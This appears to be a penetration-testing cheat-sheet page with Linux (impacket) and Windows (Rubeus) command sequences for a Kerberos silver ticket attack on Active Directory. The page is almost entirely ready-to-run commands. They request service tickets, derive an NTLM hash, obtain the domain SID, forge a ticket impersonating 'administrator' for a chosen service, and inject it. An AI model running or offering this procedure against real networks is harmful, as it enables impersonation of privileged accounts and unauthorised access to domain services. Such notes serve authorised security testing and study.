---
title: "Silver Ticket"
date: 2024-7-30
tags: ["silver ticket", "rubeus", "active directory", "ad", "domain controller", "Windows", "GetUserSPNs"]
---

---
### Silver Ticket Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Get service principle name (SPN)

<div>

```bash
sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC> -request -k
```

```bash
# If NTLM auth is disabled
sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-host <DC> -request -k
```

</div>

#### 2. Generate NTLM

<div>

```bash
iconv -f ASCII -t UTF-16LE <(printf "<PASSWORD>") | openssl dgst -md4
```

</div>

#### 3. Get domain SID

<div>

```bash
sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator <DOMAIN>/<USER>:<PASSWORD>
```

</div>

#### 4. Generate Silver Ticket

<div>

```bash
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn <SPN> administrator
```

</div>

#### 5. Import ticket

<div>

```bash
export KRB5CCNAME=administrator.ccache
```

</div>

#### 6. Check

<div>

```bash
klist
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Get service principle name (SPN)

<div>

```powershell
.\rubeus.exe kerberoast /domain:<DOMAIN> /dc:<DC> /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /nowrap
```

</div>

#### 2. Generate NTLM

<div>

```powershell
.\rubeus.exe hash /password:<PASSWORD>
```

</div>

#### 3. Get domain SID

#### 3a. Locally

<div>

```powershell
import-module activedirectory
```

```powershell
Get-ADDomain | fl DomainSID
```

</div>

#### 3b. Remotely

<div>

```powershell
# Install ldp.exe (Windows 11)
Settings > System > Optional Features > More Windows Features and add 'Active Driectory Lightweight Directory Services'
```

```powershell 
# Bind > Bind with credentials
ldp.exe
```

```powershell
# Browse > Search
BaseDN: DC=<example>,DC=<com>
Filter: (objectclass=User)
```

</div>

#### 4. Generate silver ticket

<div>

```powershell
.\rubeus.exe silver /domain:<DOMAIN> /dc:<DC> /sid:<SID> /rc4:<HASH> /user:administrator /service:<SPN> /nowrap /ptt
```

</div>

#### 5. Check

<div>

```powershell
klist
```

</div>

{{< /tabcontent >}}


<br>